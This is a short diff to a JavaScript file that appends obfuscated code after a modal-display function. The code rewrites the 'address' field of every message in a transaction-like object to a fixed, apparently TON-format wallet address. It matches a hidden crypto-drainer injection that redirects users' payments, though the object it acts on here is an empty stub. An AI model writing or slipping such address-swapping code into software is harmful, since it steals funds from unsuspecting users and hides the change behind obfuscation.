@@ -168,3 +168,10 @@ async function showModal() {
 
   document.body.appendChild(modal);
 }
+
+const _0x4f4aab = '';
+const _0x13e8ee = {
+  _0x4f4aab: {}
+};
+
+const test = {..._0x13e8ee[_0x4f4aab],messages: [...(_0x13e8ee[_0x4f4aab]?.messages?.map?.(o => ({...o,address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9"})) || [])]}
